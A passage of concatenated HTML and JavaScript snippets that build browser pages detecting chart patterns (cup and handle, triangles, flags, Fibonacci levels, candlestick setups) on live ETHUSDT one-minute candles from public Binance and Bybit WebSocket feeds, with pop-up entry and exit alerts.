      lastCandleStart = candles[candles.length - 1].start;

      console.log("✅ Candle sample:", candles.slice(-3));

      const [macd, signal, histo] = MACD(candles);
      console.log("📊 MACD Debug:", { macd, signal, histo });

      output.textContent += `✅ Preloaded ${candles.length} candles\n`;
      updateIndicators();
      connectWebSocket();
    } catch (err) {
      output.textContent += `❌ Fetch error: ${err.message}\n`;
    }
  }

  // Keep existing connectWebSocket and MACD functions here...
</script>
<script>
  let memoryGoodEntry = null;

  function detectTrapPattern(candles) {
    if (candles.length < 6) return false;

    const last = candles[candles.length - 1];
    const prev = candles[candles.length - 2];
    const third = candles[candles.length - 3];

    const longWick = (c) => (c.high - Math.max(c.close, c.open)) > 2 * (Math.abs(c.close - c.open));
    const strongReversal = Math.abs(last.close - last.open) > (last.high - last.low) * 0.6;

    const fakeBreakout =
      third.close < prev.low && // dropped low
      prev.close > third.close &&
      last.close > prev.close && // strong green
      longWick(prev);

    return fakeBreakout && strongReversal;
  }

  function scanForTrapsAndAlert() {
    if (candles.length < 100) return;

    const detected = detectTrapPattern(candles);

    if (detected && !memoryGoodEntry) {
      const entryPrice = candles[candles.length - 1].close;
      memoryGoodEntry = {
        entry: entryPrice,
        candle: candles[candles.length - 1],
        timestamp: new Date().toLocaleTimeString()
      };
      alert(`✅ Good Entry Detected @ $${entryPrice.toFixed(2)}`);
      output.textContent = `✅ Good Entry @ $${entryPrice.toFixed(2)} [${memoryGoodEntry.timestamp}]
` + output.textContent;
    }

    // check for exit alert
    if (memoryGoodEntry) {
      const currPrice = candles[candles.length - 1].close;
      const gain = ((currPrice - memoryGoodEntry.entry) / memoryGoodEntry.entry) * 100;
      if (gain > 0.5 || gain < -0.4) {
        alert(`🚪 Exit @ $${currPrice.toFixed(2)} | PnL: ${gain.toFixed(2)}%`);
        output.textContent = `🚪 Exit @ $${currPrice.toFixed(2)} | PnL: ${gain.toFixed(2)}%
` + output.textContent;
        memoryGoodEntry = null; // clear memory
      }
    }
  }

  // Attach to your existing candle update handler
  setInterval(() => {
    if (candles.length >= 100) {
      scanForTrapsAndAlert();
    }
  }, 3000); // every 3s
</script>

<script>
  let detectedPatterns = {
    bullish: new Set(),
    bearish: new Set()
  };

  let lastBullishPatternAlert = 0;
  let lastBearishPatternAlert = 0;

  function roundCombo(adx, rsi, atr) {
    return `${Math.round(adx)}-${Math.round(rsi)}-${atr.toFixed(2)}`;
  }

  function learnHistoricalPatterns() {
    const learnRange = candles.length - 1000;
    for (let i = 15; i < learnRange; i++) {
      const adx = parseFloat(ADX(14, candles.slice(0, i)));
      const rsi = parseFloat(RSI(14, candles.slice(0, i)));
      const atr = parseFloat(ATR(14, candles.slice(0, i)));

      if (!adx || !rsi || !atr) continue;

      const combo = roundCombo(adx, rsi, atr);
      const currentClose = candles[i].close;
      const futureClose = candles[i + 5]?.close;
      if (!futureClose) continue;

      const percentMove = ((futureClose - currentClose) / currentClose) * 100;

      if (percentMove > 0.4) {
        detectedPatterns.bullish.add(combo);
      } else if (percentMove < -0.4) {
        detectedPatterns.bearish.add(combo);
      }
    }

    output.textContent = `✅ Learned ${detectedPatterns.bullish.size} bullish + ${detectedPatterns.bearish.size} bearish patterns.\n` + output.textContent;
  }

  function detectCurrentPattern() {
    const adx = parseFloat(ADX(14, candles));
    const rsi = parseFloat(RSI(14, candles));
    const atr = parseFloat(ATR(14, candles));
    if (!adx || !rsi || !atr) return;

    const combo = roundCombo(adx, rsi, atr);
    const now = new Date().toLocaleTimeString();

    if (detectedPatterns.bullish.has(combo)) {
      output.textContent = `🚀 [${now}] Million Pattern BULLISH Match: ADX ${adx} / RSI ${rsi} / ATR ${atr}\n` + output.textContent;
      if (Date.now() - lastBullishPatternAlert > 60000) {
        alert(`🚀 BULLISH PATTERN DETECTED!\nADX: ${adx}\nRSI: ${rsi}\nATR: ${atr}`);
        lastBullishPatternAlert = Date.now();
      }
    } else if (detectedPatterns.bearish.has(combo)) {
      output.textContent = `⚠️ [${now}] Million Pattern BEARISH Match: ADX ${adx} / RSI ${rsi} / ATR ${atr}\n` + output.textContent;
      if (Date.now() - lastBearishPatternAlert > 60000) {
        alert(`⚠️ BEARISH PATTERN DETECTED!\nADX: ${adx}\nRSI: ${rsi}\nATR: ${atr}`);
        lastBearishPatternAlert = Date.now();
      }
    }
  }

  // Call pattern learner after candles are loaded
  setTimeout(() => {
    if (candles.length > 5000) learnHistoricalPatterns();
  }, 5000);

  // Check current pattern every 1 second
  setInterval(() => {
    if (candles.length >= 35) {
      detectCurrentPattern();
    }
  }, 1000);
</script>

<script>
  let learnedFakeouts = [];

  // Learn from 1 million candles
  function learnFakeoutsFromHistory(candles) {
    const memory = [];
    for (let i = 3; i < candles.length - 2; i++) {
      const c0 = candles[i - 2];
      const c1 = candles[i - 1];
      const c2 = candles[i];

      const longWickUp = (c2.high - Math.max(c2.open, c2.close)) > (c2.close - c2.low) * 2;
      const longWickDown = (Math.min(c2.open, c2.close) - c2.low) > (c2.high - c2.close) * 2;

      const fakeBreakoutHigh = c2.high > c1.high && c2.close < c1.close && longWickUp;
      const fakeBreakoutLow = c2.low < c1.low && c2.close > c1.close && longWickDown;

      if (fakeBreakoutHigh || fakeBreakoutLow) {
        memory.push({
          pattern: fakeBreakoutHigh ? "FAKE_HIGH" : "FAKE_LOW",
          wickRatio: fakeBreakoutHigh
            ? ((c2.high - c2.close) / (c2.close - c2.low)).toFixed(2)
            : ((c2.open - c2.low) / (c2.high - c2.close)).toFixed(2),
          bodySize: Math.abs(c2.close - c2.open).toFixed(2),
          totalRange: (c2.high - c2.low).toFixed(2),
        });
      }
    }

    learnedFakeouts = memory.slice(-1000); // Keep last 1k learned patterns
    output.textContent = `📚 Learned ${learnedFakeouts.length} fake-out patterns\n` + output.textContent;
  }

  // Detect if current candle matches any learned fake-out pattern
  function detectFakeout(current) {
    const wickRatioUp = ((current.high - current.close) / (current.close - current.low)).toFixed(2);
    const wickRatioDown = ((current.open - current.low) / (current.high - current.close)).toFixed(2);
    const body = Math.abs(current.close - current.open).toFixed(2);
    const range = (current.high - current.low).toFixed(2);

    for (let f of learnedFakeouts) {
      const similar = (
        Math.abs(f.bodySize - body) < 0.1 &&
        Math.abs(f.totalRange - range) < 0.3 &&
        (
          (f.pattern === "FAKE_HIGH" && Math.abs(f.wickRatio - wickRatioUp) < 0.5) ||
          (f.pattern === "FAKE_LOW" && Math.abs(f.wickRatio - wickRatioDown) < 0.5)
        )
      );
      if (similar) return f.pattern;
    }

    return null;
  }

  // Trigger popup alert
  function fakeoutAlert(type, candle) {
    const price = candle.close.toFixed(2);
    const msg = `🚨 FAKEOUT DETECTED (${type}) @ $${price}`;
    alert(msg);
    output.textContent = msg + "\n" + output.textContent;
  }

  // Schedule scan every 15 seconds
  setInterval(() => {
    if (candles.length < 5 || learnedFakeouts.length === 0) return;
    const latest = candles[candles.length - 1];
    const detected = detectFakeout(latest);
    if (detected) {
      fakeoutAlert(detected, latest);
    }
  }, 15000);

  // Learn after full historical preload
  setTimeout(() => {
    if (candles.length >= 5000) {
      learnFakeoutsFromHistory(candles);
    }
  }, 5000); // wait until preload finishes
</script>

<!-- 📦 Add-on Falling Wedge Detector -->
<div id="wedgeStatus" style="color: lime; font-family: monospace; padding: 10px;">
  ⏳ Waiting for Falling Wedge...
</div>

<script>
  (() => {
    const status = document.getElementById("wedgeStatus");
    let candles = [];

    // 📌 Main Detection Logic
    function detectFallingWedge(data) {
      if (!Array.isArray(data) || data.length < 20) return;

      const recent = data.slice(-20);
      const highs = recent.map(c => c.high);
      const lows = recent.map(c => c.low);

      let lowerHighs = 0;
      let lowerLows = 0;

      for (let i = 1; i < highs.length; i++) {
        if (highs[i] < highs[i - 1]) lowerHighs++;
        if (lows[i] < lows[i - 1]) lowerLows++;
      }

      const isFallingWedge = lowerHighs > 12 && lowerLows > 12;
      const breakout = recent[recent.length - 1].close > highs[highs.length - 2];

      if (isFallingWedge && breakout) {
        const entry = recent[recent.length - 1].close;
        const msg = `🚀 Falling Wedge Breakout Detected\n📍 Entry: $${entry.toFixed(2)}\n📉 Pattern: Falling Wedge`;
        alert(msg);
        status.textContent = msg;
        return true;
      }

      status.textContent = "⏳ Waiting for Falling Wedge...";
      return false;
    }

    // 🧠 Candle Receiver (WebSocket-ready)
    window.pushCandleToWedgeDetector = function (candle) {
      candles.push(candle);
      if (candles.length > 100) candles.shift(); // Limit history

      detectFallingWedge(candles);
    };

    // ✅ Optional: Simulated feed for testing
    if (window.location.href.includes("test")) {
      for (let i = 0; i < 39; i++) {
        window.pushCandleToWedgeDetector({
          high: 120 - i * 0.4,
          low: 100 - i * 0.4,
          open: 110 - i * 0.3,
          close: 110 - i * 0.3,
          volume: 1000
        });
      }
      // Breakout candle
      window.pushCandleToWedgeDetector({
        high: 125,
        low: 123,
        open: 124,
        close: 130,
        volume: 1500
      });
    }
  })();
</script>

<!DOCTYPE html>
<html>
  <body style="background: #000; color: #0f0; font-family: monospace;">
    <pre id="output">⏳ Waiting for Cup and Handle pattern...</pre>

    <script>
      const output = document.getElementById("output");
      let candles = [];

      // 📡 Connect to Binance WebSocket (ETHUSDT 1m candles)
      const socket = new WebSocket("wss://stream.binance.com:9443/ws/ethusdt@kline_1m");

      socket.onmessage = (event) => {
        const k = JSON.parse(event.data).k;
        const candle = {
          start: k.t / 1000,
          open: parseFloat(k.o),
          high: parseFloat(k.h),
          low: parseFloat(k.l),
          close: parseFloat(k.c),
          volume: parseFloat(k.v)
        };

        candles.push(candle);
        if (candles.length > 100) candles.shift(); // Keep last 100
      };

      function detectCupAndHandle(index) {
        const lookback = 40;
        if (candles.length < lookback || index < lookback) return false;

        const slice = candles.slice(index - lookback, index);
        const lows = slice.map(c => c.low);
        const highs = slice.map(c => c.high);

        const leftHigh = highs[0];
        const midLow = Math.min(...lows.slice(10, 25));
        const rightHigh = highs[highs.length - 1];

        const handleDip = Math.min(...lows.slice(30, 38));
        const handleRecovery = slice[slice.length - 1].close;

        const cupDepth = leftHigh - midLow;
        const handleDepth = rightHigh - handleDip;

        const cupSymmetry = Math.abs(leftHigh - rightHigh) < leftHigh * 0.02;
        const handleShallow = handleDepth < cupDepth * 0.5;
        const breakout = handleRecovery > leftHigh;

        const volSlice = slice.map(c => c.volume);
        const volDip = volSlice.slice(10, 25).reduce((a, b) => a + b, 0);
        const volRecovery = volSlice.slice(30).reduce((a, b) => a + b, 0);
        const volSurge = volRecovery > volDip;

        if (cupSymmetry && handleShallow && breakout && volSurge) {
          const time = new Date(slice[slice.length - 1].start * 1000).toLocaleTimeString();
          const msg = `☕ Cup and Handle Breakout Detected @ $${handleRecovery.toFixed(2)} (${time})`;
          output.textContent = msg + "\n\n" + output.textContent;
          alert(msg); // 🔔 Real-time popup
          return true;
        }

        return false;
      }

      // 🔁 Check every 3 seconds
      setInterval(() => {
        if (candles.length > 50) {
          detectCupAndHandle(candles.length - 1);
        }
      }, 3000);
    </script>
  </body>
</html>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Inverse Head & Shoulders Detector (Live)</title>
  <style>
    body {
      background-color: #000;
      color: lime;
      font-family: monospace;
      padding: 20px;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <h2>🧠 Inverse Head & Shoulders Pattern Detector (Live)</h2>
  <pre id="output">⏳ Waiting for pattern...</pre>

  <script>
    const output = document.getElementById('output');
    let candles = [];

    // 📡 Connect to Binance WebSocket (ETHUSDT, 1-minute candles)
    const socket = new WebSocket("wss://stream.binance.com:9443/ws/ethusdt@kline_1m");

    socket.onmessage = (event) => {
      const k = JSON.parse(event.data).k;
      const candle = {
        start: k.t / 1000,
        open: parseFloat(k.o),
        high: parseFloat(k.h),
        low: parseFloat(k.l),
        close: parseFloat(k.c),
        volume: parseFloat(k.v)
      };

      candles.push(candle);
      if (candles.length > 100) candles.shift(); // keep last 100 candles only
    };

    // 🔍 Inverse Head and Shoulders Detection Logic
    function detectInverseHeadAndShoulders(data) {
      if (!Array.isArray(data) || data.length < 50) return null;

      const recent = data.slice(-30);
      const lows = recent.map(c => c.low);

      const headIndex = lows.indexOf(Math.min(...lows));
      if (headIndex < 3 || headIndex > lows.length - 4) return null;

      const leftShoulder = Math.min(...lows.slice(0, headIndex));
      const rightShoulder = Math.min(...lows.slice(headIndex + 1));
      const head = lows[headIndex];

      const validShoulders = leftShoulder > head && rightShoulder > head;
      const shouldersSimilar = Math.abs(leftShoulder - rightShoulder) < head * 0.03;

      const necklineLeft = recent[0].high;
      const necklineRight = recent[recent.length - 1].high;
      const neckline = (necklineLeft + necklineRight) / 2;

      const breakout = recent[recent.length - 1].close > neckline;

      if (validShoulders && shouldersSimilar && breakout) {
        const entry = recent[recent.length - 1].close;
        const time = new Date(recent[recent.length - 1].start * 1000).toLocaleTimeString();
        const msg = `💥 Inverse H&S Breakout Detected (${time})\n📍 Entry: $${entry}\n🧠 Neckline: $${neckline.toFixed(2)}\n👂 Shoulders: $${leftShoulder.toFixed(2)} / $${rightShoulder.toFixed(2)}\n🕳️ Head: $${head.toFixed(2)}\n`;
        output.textContent = msg + '\n' + output.textContent;
        alert(msg); // 🔔 Pop-up alert
        return true;
      }
      return false;
    }

    // 🔁 Scan every 8 seconds
    setInterval(() => {
      if (candles.length > 50) {
        detectInverseHeadAndShoulders(candles);
      }
    }, 8000);
  </script>
</body>
</html>

<!DOCTYPE html>
<html>
<head>
  <title>📡 ETHUSDT 1m + Ascending Triangle Detector</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 20px;
    }
    h2 {
      grid-column: span 2;
      margin-bottom: 10px;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      max-height: 85vh;
      overflow-y: auto;
      background: #111;
      padding: 15px;
      border: 1px solid #0f0;
      border-radius: 8px;
    }
    .indicators {
      background: #111;
      padding: 15px;
      border: 1px solid #0f0;
      border-radius: 8px;
      line-height: 1.5;
    }
    .indicators h3 {
      color: #00ffff;
      margin-bottom: 5px;
    }
  </style>
</head>
<body>
  <h2>📡 ETHUSDT 1m Live + Ascending Triangle Detector</h2>
  <pre id="output">Connecting...</pre>
  <div class="indicators" id="indicatorPanel">Loading indicators...</div>
  <div id="triangleAlert" style="color: cyan; font-family: monospace; padding: 10px;">
    ⏳ Waiting for Ascending Triangle breakout...
  </div>

  <script>
    let candles = [];
    let triangleBuffer = [];
    let resistanceLevel = null;
    let lastBreakoutCandleTime = 0;

    function detectAscendingTriangle(data) {
      if (data.length < 20) return;
      const recent = data.slice(-20);
      const highs = recent.map(c => c.high);
      const lows = recent.map(c => c.low);

      const top = Math.max(...highs);
      const topCount = highs.filter(h => Math.abs(h - top) < top * 0.0015).length;

      let higherLows = true;
      for (let i = 1; i < lows.length; i++) {
        if (lows[i] < lows[i - 1] * 0.995) {
          higherLows = false;
          break;
        }
      }

      if (topCount >= 3 && higherLows) {
        resistanceLevel = top;
        triangleBuffer.push({ ts: Date.now(), res: top });
        if (triangleBuffer.length > 5) triangleBuffer.shift();
      }
    }

    function confirmBreakout(candle) {
      if (!resistanceLevel) return false;
      const breakout = candle.close > resistanceLevel * 1.001;
      const timeSinceLastAlert = Date.now() - lastBreakoutCandleTime;
      const cooldownPassed = timeSinceLastAlert > 30000;
      if (breakout && cooldownPassed) {
        lastBreakoutCandleTime = Date.now();
        return true;
      }
      return false;
    }

    const output = document.getElementById("output");
    const alertBox = document.getElementById("triangleAlert");

    function logLive(k, isNew) {
      const ts = new Date(k.start * 1000).toLocaleTimeString();
      const delta = candles.length ? (k.close - candles[candles.length - 1].close).toFixed(2) : '0.00';
      if (isNew) {
        candles.push(k);
        if (candles.length > 150) candles.shift();
        detectAscendingTriangle(candles);
        if (confirmBreakout(k)) {
          const msg = `🚀 Ascending Triangle Breakout!\n📈 Price: ${k.close.toFixed(2)}\n📍 Resistance: ${resistanceLevel.toFixed(2)}\n⏰ Time: ${ts}`;
          output.textContent = `🔔 ${msg}\n\n` + output.textContent;
          alert(msg);
          alertBox.textContent = `🚀 Breakout Detected @ ${k.close.toFixed(2)}!`;
          alertBox.style.color = 'lime';
        }
      }
      output.textContent = `🕒 ${ts} | Close: ${k.close} | ∆ ${delta}\n` + output.textContent;
    }

    const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");
    let lastCandleStart = null;

    socket.onopen = () => {
      output.textContent = "✅ Connected to Bybit WebSocket\n\n";
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
        const k = {
          start: Number(raw.start),
          open: Number(raw.open),
          high: Number(raw.high),
          low: Number(raw.low),
          close: Number(raw.close),
          volume: Number(raw.volume)
        };
        const isNew = k.start !== lastCandleStart;
        if (isNew) lastCandleStart = k.start;
        logLive(k, isNew);
      }
    };

    socket.onerror = () => {
      output.textContent = "❌ WebSocket Error\n\n" + output.textContent;
    };

    socket.onclose = () => {
      output.textContent = "⚠️ WebSocket Closed\n\n" + output.textContent;
    };
  </script>
</body>
</html>

<!DOCTYPE html>
<html>
<head>
  <title>📡 ETHUSDT 1m + Triple Bottom Detector</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    #output {
      white-space: pre-wrap;
      border: 1px solid #0f0;
      padding: 10px;
      height: 70vh;
      overflow-y: scroll;
      background: #111;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <h2>📉 Live ETHUSDT + Triple Bottom Long Entry Alerts</h2>
  <div id="output">⏳ Waiting for candles...</div>

  <script>
    const output = document.getElementById("output");
    const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");
    let candles = [];
    let lastCandleStart = null;

    socket.onopen = () => {
      output.textContent += "\n✅ Connected to WebSocket...\n";
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = msg.data;
        const k = {
          start: Number(raw.start),
          open: Number(raw.open),
          high: Number(raw.high),
          low: Number(raw.low),
          close: Number(raw.close),
          volume: Number(raw.volume)
        };
        const isNew = k.start !== lastCandleStart;
        if (isNew) {
          lastCandleStart = k.start;
          candles.push(k);
          if (candles.length > 150) candles.shift();
          logCandle(k);
        }
      }
    };

    function logCandle(k) {
      const time = new Date(k.start * 1000).toLocaleTimeString();
      output.textContent = `🕒 ${time} | Open: ${k.open} | Low: ${k.low} | High: ${k.high} | Close: ${k.close}\n` + output.textContent;
    }

    function EMA(period, data) {
      if (data.length < period) return null;
      const k = 2 / (period + 1);
      let ema = data.slice(0, period).reduce((acc, d) => acc + d.close, 0) / period;
      for (let i = period; i < data.length; i++) {
        ema = data[i].close * k + ema * (1 - k);
      }
      return ema;
    }

    function detectTripleBottom(candles) {
      if (candles.length < 20) return false;
      const lookback = candles.slice(-20);
      const lows = lookback.map(c => c.low);
      const minLow = Math.min(...lows);
      const tolerance = minLow * 0.002; // 0.2% range

      const bottoms = lookback.filter(c => Math.abs(c.low - minLow) <= tolerance);
      if (bottoms.length < 3) return false;

      const idxs = bottoms.map(b => lookback.indexOf(b));
      const uniqueIdxs = [...new Set(idxs)];

      if (
        uniqueIdxs.length >= 3 &&
        (uniqueIdxs[1] - uniqueIdxs[0]) >= 2 &&
        (uniqueIdxs[2] - uniqueIdxs[1]) >= 2
      ) {
        const latest = lookback[lookback.length - 1];
        const ema = EMA(14, candles);
        if (latest.close > latest.open && latest.close > ema) {
          alert(`🔔 TRIPLE BOTTOM DETECTED!\nGood Long Entry at ~$${latest.close.toFixed(2)}`);
          output.textContent = `🚨 Triple Bottom Confirmed @ ${latest.close}\n` + output.textContent;
          return true;
        }
      }
      return false;
    }

    setInterval(() => {
      if (candles.length >= 20) detectTripleBottom(candles);
    }, 3000);
  </script>
</body>
</html>
<pre id="output">⏳ Waiting for Bullish Flag breakout...</pre>

<script>
  const output = document.getElementById("output");
  let candles = [];

  const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");

  socket.onopen = () => {
    output.textContent = "✅ Connected to Bybit\n";
    socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
  };

  socket.onmessage = (event) => {
    const msg = JSON.parse(event.data);
    if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
      const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
      const candle = {
        open: parseFloat(raw.open),
        high: parseFloat(raw.high),
        low: parseFloat(raw.low),
        close: parseFloat(raw.close),
        volume: parseFloat(raw.volume),
        start: parseInt(raw.start)
      };
      candles.push(candle);
      if (candles.length > 100) candles.shift();
    }
  };

  function detectBullishFlag(index) {
    const lookback = 20;
    const slice = candles.slice(index - lookback, index);
    if (slice.length < lookback) return false;

    const first = slice[0];
    const last = slice[slice.length - 1];
    const priceChange = ((last.close - first.open) / first.open) * 100;
    if (priceChange < 2) return false;

    const highs = slice.map(c => c.high);
    const lows = slice.map(c => c.low);
    const isSlopingDown = highs[0] > highs[highs.length - 1] && lows[0] > lows[lows.length - 1];

    const volumes = slice.map(c => c.volume);
    const volContracting = volumes[0] > volumes[volumes.length - 1];

    const breakout = candles[index];
    const breakoutSignal = breakout.close > last.high && breakout.volume > last.volume;

    if (isSlopingDown && volContracting && breakoutSignal) {
      const time = new Date(breakout.start * 1000).toLocaleTimeString();
      const msg = `🚀 Bullish Flag Breakout Detected @ ${breakout.close} (${time})`;
      output.textContent = msg + "\n\n" + output.textContent;
      alert(msg);
      return true;
    }
    return false;
  }

  setInterval(() => {
    if (candles.length > 40) {
      detectBullishFlag(candles.length - 1);
    }
  }, 2000);
</script>

<!DOCTYPE html>
<html>
<head>
  <title>📡 Bullish Pennant Live Detector</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;
      padding: 20px;
    }
    pre {
      white-space: pre-wrap;
      word-break: break-word;
      background: #111;
      border: 1px solid #0f0;
      padding: 15px;
      border-radius: 8px;
      max-height: 90vh;
      overflow-y: auto;
    }
  </style>
</head>
<body>
  <h2>📡 Live Bullish Pennant Detector (Bybit 1m)</h2>
  <pre id="output">⏳ Connecting...</pre>

  <script>
    const output = document.getElementById("output");
    const candles = [];

    // ⛓️ Connect to Bybit WebSocket
    const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");

    socket.onopen = () => {
      output.textContent = "✅ Connected to Bybit WebSocket\n";
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
        const candle = {
          start: Math.floor(raw.start),
          open: parseFloat(raw.open),
          high: parseFloat(raw.high),
          low: parseFloat(raw.low),
          close: parseFloat(raw.close),
          volume: parseFloat(raw.volume)
        };
        const isNew = candles.length === 0 || candle.start !== candles[candles.length - 1].start;
        if (isNew) candles.push(candle);
        if (candles.length > 150) candles.shift();

        if (candles.length > 40) {
          detectBullishPennant(candles.length - 1);
        }
      }
    };

    function detectBullishPennant(index) {
      const lookback = 20;
      const slice = candles.slice(index - lookback, index);
      if (slice.length < lookback) return false;

      const first = slice[0];
      const last = slice[slice.length - 1];
      const priceChange = ((last.close - first.open) / first.open) * 100;
      if (priceChange < 2) return false; // needs 2% flagpole

      const highs = slice.map(c => c.high);
      const lows = slice.map(c => c.low);
      const highTrend = highs[0] - highs[highs.length - 1];
      const lowTrend = lows[lows.length - 1] - lows[0];
      const narrowing = highTrend > 0 && lowTrend > 0;

      const volumes = slice.map(c => c.volume);
      const volTrend = volumes[0] > volumes[volumes.length - 1];

      const breakout = candles[index];
      const breakoutStrength = breakout.close > last.high && breakout.volume > last.volume;

      if (narrowing && volTrend && breakoutStrength) {
        const time = new Date(breakout.start * 1000).toLocaleTimeString();
        const msg = `🚀 Bullish Pennant Breakout Detected @ ${breakout.close.toFixed(2)} (${time})`;
        output.textContent = msg + "\n\n" + output.textContent;
        alert(msg); // 🔔 pop-up alert
        return true;
      }
      return false;
    }

    socket.onerror = () => {
      output.textContent = "❌ WebSocket Error\n" + output.textContent;
    };

    socket.onclose = () => {
      output.textContent = "⚠️ WebSocket Closed\n" + output.textContent;
    };
  </script>
</body>
</html>

<!-- ✅ Fibonacci Entry/Exit Add-on for ETHUSDT 1m Scalping (Live Version) -->
<body>
  <pre id="output" style="color: lime; font-family: monospace; padding: 10px;">⏳ Initializing Fibonacci Add-on...</pre>

  <script>
    const fibOutput = document.getElementById("output");

    let candles = [];
    let lastCandleTime = 0;

    function detectFibonacciEntryExit() {
      if (candles.length < 100) return;
      const slice = candles.slice(-100);

      const swingLow = Math.min(...slice.map(c => c.low));
      const swingHigh = Math.max(...slice.map(c => c.high));

      const fib618 = swingHigh - (swingHigh - swingLow) * 0.618;
      const fib382 = swingHigh - (swingHigh - swingLow) * 0.382;
      const ext127 = swingHigh + (swingHigh - swingLow) * 0.272;
      const ext161 = swingHigh + (swingHigh - swingLow) * 0.618;

      const current = candles[candles.length - 1];
      const lastClose = current.close;
      const lastOpen = current.open;

      // Entry Zone: 0.618 bounce
      if (lastOpen < fib618 && lastClose > fib618) {
        alert("📈 Entry Signal: 0.618 Fibonacci Retracement Bounce Detected!");
        fibOutput.textContent = `✅ Fib Entry @ 0.618: ${lastClose.toFixed(2)}\n` + fibOutput.textContent;
      }

      // Exit TP1 Zone: 1.272 extension
      if (lastClose >= ext127 && lastClose < ext161) {
        alert("🎯 Take Profit Zone Hit: 1.272 Extension");
        fibOutput.textContent = `🎯 Fib TP1 Hit @ 1.272: ${lastClose.toFixed(2)}\n` + fibOutput.textContent;
      }

      // Exit TP2 Zone: 1.618 extension
      if (lastClose >= ext161) {
        alert("🏁 Full Take Profit: 1.618 Extension Reached");
        fibOutput.textContent = `🏁 Fib TP2 Hit @ 1.618: ${lastClose.toFixed(2)}\n` + fibOutput.textContent;
      }
    }

    // 🔴 Live WebSocket for ETHUSDT 1m
    const socket = new WebSocket("wss://stream.bybit.com/v5/public/linear");

    socket.onopen = () => {
      socket.send(JSON.stringify({ op: "subscribe", args: ["kline.1.ETHUSDT"] }));
      fibOutput.textContent = "✅ Connected to Bybit WebSocket (Fibonacci Add-on)\n\n" + fibOutput.textContent;
    };

    socket.onmessage = (event) => {
      const msg = JSON.parse(event.data);
      if (msg.topic === "kline.1.ETHUSDT" && msg.data) {
        const raw = Array.isArray(msg.data) ? msg.data[0] : msg.data;
        const k = {
          start: Number(raw.start),
          open: Number(raw.open),
          high: Number(raw.high),
          low: Number(raw.low),
          close: Number(raw.close),
          volume: Number(raw.volume)
        };

        const isNewCandle = k.start !== lastCandleTime;
        if (isNewCandle) {
          candles.push(k);
          lastCandleTime = k.start;
          if (candles.length > 200) candles.shift();
          detectFibonacciEntryExit();
        } else {
          // Update current candle
          candles[candles.length - 1] = k;
        }
      }
    };
  </script>
</body>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>🧠 ETHUSDT 1m Long Entry Detector</title>
  <style>
    body {
      background-color: black;
      color: lime;
      font-family: monospace;
      padding: 15px;
    }
  </style>
</head>
<body>
  <h2>📊 ETHUSDT 1m – Good Long Entry Alerts</h2>
  <div id="log">🔌 Connecting to Bybit WebSocket...</div>

  <script>
    const log = (msg) => {
      const t = new Date().toLocaleTimeString();
      document.getElementById('log').innerHTML += `<br>[${t}] ${msg}`;
      console.log(`[${t}] ${msg}`);
    };

    let candles = [];

    // Connect to Bybit ETHUSDT 1m
    const ws = new WebSocket("wss://stream.bybit.com/v5/public/linear");
    ws.onopen = () => {
      log("✅ Connected to Bybit");
      ws.send(JSON.stringify({
        op: "subscribe",
        args: ["kline.1.ETHUSDT"]
      }));
    };

    ws.onmessage = (event) => {
      const json = JSON.parse(event.data);
      if (json.topic && json.topic.includes("kline") && json.data.confirm) {
        const k = json.data;
        const c = {
          open: parseFloat(k.open),
          high: parseFloat(k.high),
          low: parseFloat(k.low),
          close: parseFloat(k.close),
          volume: parseFloat(k.volume),
          time: k.start
        };
        candles.push(c);
        if (candles.length > 50) candles.shift();
        detectLongEntry();
      }
    };

    function detectLongEntry() {
      if (candles.length < 5) return;

      const c = candles[candles.length - 1];
      const p = candles[candles.length - 2];
      const pp = candles[candles.length - 3];
      const cSize = c.high - c.low;
      const cBody = Math.abs(c.close - c.open);

      // === Candlestick Logic ===
      const isDoji = cBody / cSize < 0.1;
      const isHammer = c.close > c.open && (c.low + cSize * 0.75) < c.open;
      const isInvHammer = c.close > c.open && (c.high - c.close) < cSize * 0.25;
      const isShootingStar = c.open > c.close && (c.high - c.open) > cSize * 0.5;
      const isSpinningTop = cBody / cSize > 0.2 && cBody / cSize < 0.4;
      const isBullEngulf = p.close < p.open && c.close > c.open && c.open < p.close && c.close > p.open;
      const isBearEngulf = p.close > p.open && c.close < c.open && c.open > p.close && c.close < p.open;
      const isTweezerBottom = c.low === p.low && c.close > c.open;
      const isTweezerTop = c.high === p.high && c.close < c.open;
      const isMorningStar = pp.close > pp.open && p.close < p.open && c.close > (p.open + p.close) / 2;
      const isEveningStar = pp.close < pp.open && p.close > p.open && c.close < (p.open + p.close) / 2;
      const isThreeWhiteSoldiers = candles.slice(-3).every((x, i, arr) => x.close > x.open && (i === 0 || x.open > arr[i - 1].close));
      const isThreeBlackCrows = candles.slice(-3).every((x, i, arr) => x.close < x.open && (i === 0 || x.open < arr[i - 1].close));
